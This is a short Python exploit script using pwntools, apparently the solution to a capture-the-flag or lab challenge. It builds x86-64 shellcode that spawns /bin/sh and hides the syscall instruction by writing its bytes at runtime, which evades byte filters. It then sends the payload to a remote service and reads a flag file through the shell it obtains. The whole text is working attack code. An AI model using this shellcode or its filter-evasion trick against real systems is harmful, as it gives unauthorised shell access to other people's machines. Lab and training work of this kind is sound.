from pwn import *

context.arch = "amd64"

sc = shellcraft.sh()
# print(sc)
# print(disasm(asm(sc)))
shellcode = asm(
    """
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    // syscall
    mov rcx, 0x040e
    add rcx, 0x0101
    mov qword ptr [rip], rcx
"""
)

# print(disasm(shellcode))
r = remote("10.113.184.121", 10042)
r.sendline(shellcode)
r.sendline(b"cat /home/lab/flag")
print(r.recv().decode())
